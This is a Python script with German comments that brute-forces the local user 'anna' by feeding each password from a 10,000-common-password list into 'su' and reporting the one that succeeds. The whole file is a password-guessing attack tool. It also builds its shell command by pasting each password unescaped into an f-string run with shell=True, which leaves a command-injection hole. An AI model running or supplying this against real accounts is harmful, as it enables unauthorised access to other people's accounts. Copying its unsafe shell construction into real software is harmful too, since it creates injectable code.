import subprocess

# Pfad zur Datei mit den 10.000 häufigsten Passwörtern
password_list_path = "./10k-most-common.txt"

# Benutzername, für den das Passwort getestet werden soll
username = "anna"

# Anzahl der Passwörter in der Liste
total_passwords = sum(1 for _ in open(password_list_path, "r"))

# Initialisieren des Zählers
counter = 0

# Versuchen Sie jedes Passwort aus der Liste
with open(password_list_path, "r") as file:
    for line in file:
        # Strip newline characters und führende/trailing Leerzeichen entfernen
        password = line.strip()
        
        # Versuchen Sie, sich mit dem aktuellen Passwort anzumelden
        command = f"echo '{password}' | su {username} 2>&1"
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Erhöhen des Zählers
        counter += 1
        
        # Drucken des Zählers und des Fortschritts
        print(f"Versuch {counter}/{total_passwords}")
        
        # Überprüfen Sie, ob die Anmeldung erfolgreich war
        if result.returncode == 0:
            print(f"Erfolgreich angemeldet als '{username}' mit dem Passwort '{password}'")
            break  # Beenden Sie die Schleife, wenn ein gültiges Passwort gefunden wurde
        else:
            print(f"Fehler beim Anmelden als '{username}' mit dem Passwort '{password}': {result.stderr.decode()}")
